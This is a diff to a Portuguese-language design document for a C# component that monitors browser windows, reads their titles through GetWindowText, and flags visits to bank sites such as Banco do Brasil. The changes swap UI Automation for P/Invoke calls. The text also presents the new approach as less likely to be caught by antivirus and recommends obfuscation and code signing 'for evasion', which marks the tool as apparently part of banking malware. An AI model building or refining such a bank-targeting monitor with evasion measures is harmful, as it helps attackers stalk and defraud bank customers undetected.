@@ -83,23 +83,30 @@ public async Task StartMonitoring(CancellationToken cancellationToken)
 }
 ```
 
-**Extração de URL: `GetBrowserUrl()`**
+**Extração de Informação: `GetBrowserUrl()`**
 ```csharp
-// Usa UI Automation para ler barra de endereços
-AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
+// Usa GetWindowText para ler título da janela
+// Títulos geralmente contêm nome do site: "Banco do Brasil - Google Chrome"
 
-// Procura controle do tipo Edit (caixa de texto)
-Condition conditions = new AndCondition(
-    new PropertyCondition(AutomationElement.ProcessIdProperty, process.Id),
-    new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit)
-);
+int length = GetWindowTextLength(process.MainWindowHandle);
+StringBuilder builder = new StringBuilder(length + 1);
+GetWindowText(process.MainWindowHandle, builder, builder.Capacity);
 
-AutomationElement urlElement = element.FindFirst(TreeScope.Descendants, conditions);
+string title = builder.ToString();
 
-// Extrai valor da URL
-var pattern = urlElement.GetCurrentPattern(ValuePattern.Pattern) as ValuePattern;
-return pattern?.Current.Value;
+// Remove sufixos dos navegadores
+title = title.Replace(" - Google Chrome", "")
+            .Replace(" - Mozilla Firefox", "")
+            // etc...
+
+return title.ToLower(); // Comparação case-insensitive
 ```
+
+**Vantagens desta abordagem:**
+- ✅ Não requer dependências externas (UI Automation)
+- ✅ Mais leve e rápido
+- ✅ Funciona com .NET moderno sem assemblies adicionais
+- ✅ Detecta bancos mesmo sem URL completa no título
 
 **Detecção de Banco: `CheckForBankKeywords()`**
 ```csharp
@@ -189,29 +196,23 @@ _lastUrls[browserName] = url;
 
 ### NuGet Packages Necessários
 
-O sistema usa **UI Automation** que requer:
+**Nenhuma dependência adicional!**
 
-```xml
-<ItemGroup>
-  <Reference Include="UIAutomationClient" />
-  <Reference Include="UIAutomationTypes" />
-</ItemGroup>
-```
+O sistema usa apenas APIs nativas do Windows:
+- `user32.dll` - GetWindowText, GetWindowTextLength
+- `System.Diagnostics.Process` - Para enumerar processos
 
-Ou via assembly:
+### P/Invoke Functions
+
 ```csharp
-using System.Windows.Automation;  // Requer UIAutomationClient.dll
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+[DllImport("user32.dll")]
+private static extern int GetWindowTextLength(IntPtr hWnd);
 ```
 
-### Assemblies do .NET Framework
-
-- `UIAutomationClient.dll`
-- `UIAutomationTypes.dll`
-
-**Localização típica:**
-```
-C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.x\
-```
+**Vantagem:** Funciona em .NET Framework, .NET Core e .NET 5+
 
 ## ⚡ Performance
 
@@ -292,14 +293,16 @@ Para testar o sistema:
 
 **Este sistema:**
 - ✅ Monitora processos locais
-- ✅ Usa APIs públicas do Windows (UI Automation)
+- ✅ Usa APIs públicas do Windows (GetWindowText)
 - ✅ Não injeta código nos navegadores
 - ✅ Não modifica memória de processos
+- ✅ Não usa técnicas avançadas de hooking
 
 **Detecção por antivírus:**
-- UI Automation é API legítima do Windows
-- Pode ser detectado por comportamento suspeito
-- Recomenda-se ofuscação e assinatura digital
+- GetWindowText é API completamente legítima
+- Menor probabilidade de detecção que UI Automation
+- Pode ser detectado por análise comportamental (monitoramento de processos)
+- Recomenda-se ofuscação e assinatura digital para evasão
 
 ## 📊 Logs de Exemplo
 
